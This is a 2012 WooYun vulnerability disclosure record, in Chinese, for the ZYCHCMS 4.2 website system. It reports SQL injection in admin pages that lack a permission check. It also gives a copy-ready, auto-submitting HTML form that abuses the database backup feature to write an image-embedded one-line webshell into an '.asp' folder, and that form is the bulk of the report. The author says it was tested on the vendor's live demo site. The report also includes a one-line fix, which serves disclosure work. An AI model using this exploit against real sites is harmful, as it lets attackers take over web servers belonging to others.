{"id": 17538, "wybug_id": "wooyun-2012-010526", "wybug_title": "ZYCHCMS企业网站管理系统SQL注入漏洞及后台拿webshell", "wybug_corp": "自由策划视觉设计工作室", "wybug_author": "无敌金创药", "wybug_date": "2012-08-03 15:25", "wybug_open_date": "2012-09-17 15:26", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-08-03：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-09-17：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： ①SQL注射漏洞②后台拿WBSHELL 详细说明：  影响版本：ZYCHCMS企业网站管理系统4.2（存在以下两个文件的版本应该是通杀）①SQL注射漏洞漏洞文件：/admin/add_js.asp   &   /admin/add_xm_jiang.asp漏洞原因：未过滤漏洞代码：都是相同的，文件开头没有调用过滤文件/admin/seeion.asp，导致没有对当前权限进行判断，就直接操作数据库。②后台拿WBSHELL进入后台有一个数据库备份，可以通过本地提交突破创建.asp后缀文件夹，并将一句话备份进去。这里在网上找了一个，改了下，将就着用。看效果如图2以下是代码本地提交代码\n<form method=\"post\" action=\"http://localhost/admin/Manage_backup.asp?action=Backup\" name=add><!--eg:http://127.0.0.1:99/admin/Manage_backup.asp?action=Backup-->        <tr>          <td height=\"30\" background=\"images/bg_list.gif\"><div style=\"padding-left:10px; font-weight:bold; color:#FFFFFF; text-align:left\">备份数据库</div></td>        </tr>        <tr>          <td bgcolor=\"#FFFFFF\"><span class=\"back_southidc\">                        </span>            <table width=\"100%\" border=\"0\" align=\"center\" cellpadding=\"5\" cellspacing=\"0\" >              <tr onmouseover=\"style.backgroundColor='#EEEEEE'\" onmouseout=\"style.backgroundColor='#F1F5F8'\" bgcolor=\"#F1F5F8\" >                <td height=\"25\" width=\"30%\" class=\"td\"><div align=\"left\">当前数据库路径</div></td>                <td width=\"70%\" class=\"td\">                  <div align=\"left\">                    <input type=\"text\" size=\"30\" name=\"DBpath\" value=\"此处为你在其网站上传的图片格式一句话路径\" />  <!--eg：../uploadfile/image/Logo/20120803130885328532_ZYCH.jpg>                                    <input type=\"hidden\" size=\"50\" name=\"bkfolder\" value=\"123.asp\" />                                  </div></td>              </tr>              <tr onmouseover=\"style.backgroundColor='#EEEEEE'\" onmouseout=\"style.backgroundColor='#FFFFFF'\" bgcolor=\"#FFFFFF\">                <td height=\"25\" width=\"30%\" class=\"td\"><div align=\"left\">备份数据库名称</div></td>                <td class=\"td\"><div align=\"left\">                      <input type=\"text\" size=\"30\" name=\"bkDBname\" value=\"4.mdb\" />                  [如备份目录有该文件，将覆盖，如沒有，将自动创建]</div></td>              </tr>              <tr onmouseover=\"style.backgroundColor='#EEEEEE'\" onmouseout=\"style.backgroundColor='#F1F5F8'\" bgcolor=\"#F1F5F8\">                <td height=\"25\" width=\"30%\" class=\"td\"><div align=\"left\"></div></td>                <td class=\"td\"><div align=\"left\">                  <input type=\"submit\" value=\"确定备份\" class=\"btn\"/>                </div></td>              </tr>          </table></td></tr></form>      </table>      </td></tr></table><script>   document.all.add.submit();   </script>\n   漏洞证明：  \n\n漏洞证明：我用官方演示站点做测试，如图1备份一句话\n\n   修复方案：  修复方法：在文件开头加入代码<!--#include file=\"seeion.asp\"-->   版权声明：转载请注明来源 无敌金创药@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}